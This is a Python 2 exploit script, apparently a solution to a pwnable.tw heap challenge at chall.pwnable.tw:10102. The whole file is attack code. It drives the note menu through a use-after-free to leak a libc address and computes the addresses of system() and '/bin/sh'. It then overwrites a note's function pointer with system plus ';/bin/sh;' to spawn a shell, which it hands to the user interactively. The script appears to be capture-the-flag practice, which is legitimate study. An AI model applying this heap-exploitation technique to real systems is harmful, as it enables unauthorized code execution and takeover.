from socket import *
from time import *
from struct import *
import telnetlib

ip='chall.pwnable.tw'
port=10102

s=socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))

t=telnetlib.Telnet()
t.sock=s

def p32(x):
        return pack('I',x)

def up32(x):
        return unpack('I',x)[0]

def recv_until(s,c):
        data=''
        while c not in data:
                data+=s.recv(1)
        return data

def add_note(choice, size, content):
        s.send(choice)
        print recv_until(s,':')
        s.send(size)
        print recv_until(s,':')
        s.send(content)
        print s.recv(1024)

def print_note(choice, index):
        s.send(choice)
        print recv_until(s,'Index :')
        s.send(index)

def delete_note(choice, index):
        s.send(choice)
        print recv_until(s,':')
        s.send(index)
        print s.recv(1024)

print s.recv(1024)

###############Memory_leak###################

add_note('1','200','A'*16)
print s.recv(1024)
add_note('1','200','B'*16)
print s.recv(1024)

delete_note('2','0')
print s.recv(1024)

add_note('1','200','C'*4)
print s.recv(1024)

raw_input('1')
print_note('3','0')
print s.recv(4)

libc_leak=up32(s.recv(4))
#libc_base=libc_leak-0x1ab450
libc_base=libc_leak-0x1b07b0
system_addr=libc_base+0x3a940
binsh_addr=libc_base+0x16084c

#############################################

print "[*]libc_leak: "+str(hex(libc_leak))
print "[*]libc_base: "+str(hex(libc_base))
print "[*]system_addr: "+str(hex(system_addr))
print "[*]binsh_addr: "+str(hex(binsh_addr))
print s.recv(4)

print s.recv(1024)
#print s.recv(1024)

delete_note('2','0')
print s.recv(1024)
delete_note('2','1')
print s.recv(1024)

raw_input('2')
#add_note('1','200','D'*4+'E'*4)
add_note('1','200',p32(system_addr)+";/bin/sh;")

print s.recv(1024)
raw_input('3')

print_note('3','0')

t.interact()
s.close()

